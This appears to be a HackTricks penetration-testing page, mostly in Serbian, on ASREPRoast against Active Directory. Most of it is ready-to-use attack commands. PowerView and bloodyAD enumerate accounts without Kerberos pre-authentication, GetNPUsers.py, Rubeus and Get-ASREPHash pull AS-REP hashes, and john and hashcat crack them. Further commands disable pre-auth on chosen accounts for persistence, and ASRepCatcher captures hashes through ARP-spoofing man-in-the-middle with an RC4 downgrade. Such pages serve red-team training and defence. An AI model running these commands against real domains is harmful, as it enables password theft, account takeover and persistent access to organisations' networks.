# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast je bezbednosni napad koji koristi korisnike koji nemaju **atribut potreban za Kerberos pre-autentifikaciju**. Suštinski, ova ranjivost omogućava napadačima da zatraže autentifikaciju za korisnika od Kontrolera domena (DC) bez potrebe za korisnikovom lozinkom. DC zatim odgovara porukom šifrovanom ključem izvedenim iz korisnikove lozinke, koji napadači mogu pokušati da dešifruju van mreže kako bi otkrili korisnikovu lozinku.

Glavni zahtevi za ovaj napad su:

- **Nedostatak Kerberos pre-autentifikacije**: Ciljani korisnici ne smeju imati ovu bezbednosnu funkciju omogućenu.
- **Veza sa Kontrolerom domena (DC)**: Napadači trebaju pristup DC-u da bi slali zahteve i primali šifrovane poruke.
- **Opcionalni domen korisnički nalog**: Imati domen korisnički nalog omogućava napadačima da efikasnije identifikuju ranjive korisnike putem LDAP upita. Bez takvog naloga, napadači moraju da pogađaju korisnička imena.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Zahtevaj AS_REP poruku
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting sa Rubeus će generisati 4768 sa tipom enkripcije 0x17 i tipom preautentifikacije 0.

### Kršenje
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast bez kredencijala

Napadač može iskoristiti poziciju man-in-the-middle da uhvati AS-REP pakete dok prolaze kroz mrežu, bez oslanjanja na to da je Kerberos pre-autentifikacija onemogućena. Stoga funkcioniše za sve korisnike na VLAN-u.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nam to omogućava. Štaviše, alat prisiljava klijentske radne stanice da koriste RC4 menjajući Kerberos pregovaranje.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Reference

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

{{#include ../../banners/hacktricks-training.md}}
